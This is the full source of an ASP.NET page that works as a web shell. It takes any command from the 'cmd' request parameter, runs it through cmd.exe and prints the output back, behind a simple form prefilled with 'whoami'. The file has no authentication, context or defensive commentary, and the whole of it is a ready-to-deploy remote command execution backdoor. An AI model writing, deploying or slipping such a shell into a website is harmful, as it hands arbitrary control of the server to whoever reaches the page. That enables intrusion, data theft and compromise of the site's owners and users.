<%@ Page Language="C#" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    string cmd = Request["cmd"];
    if (!string.IsNullOrEmpty(cmd)) {
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
        p.WaitForExit();
    }
}
</script>
<form>
    <input type="text" name="cmd" value="whoami">
    <button>Run</button>
</form>